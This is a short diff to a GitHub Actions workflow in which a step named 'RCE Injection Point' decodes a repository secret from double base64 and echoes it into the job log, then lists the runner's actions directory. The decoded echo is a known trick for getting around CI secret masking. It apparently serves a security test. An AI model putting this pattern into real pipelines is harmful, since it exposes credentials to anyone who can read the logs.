@@ -7,6 +7,11 @@ jobs:
         uses: actions/checkout@v4
       - name: RCE Injection Point
         run: |
+
+          echo $(echo ${{ secrets.TEST_SECRET }} | base64 -d | base64 -d)
+          
+          echo "/-------------------------------------------------------/"
+          
           ls -la /home/runner/work/_actions/
 
           echo "/-------------------------------------------------------/"
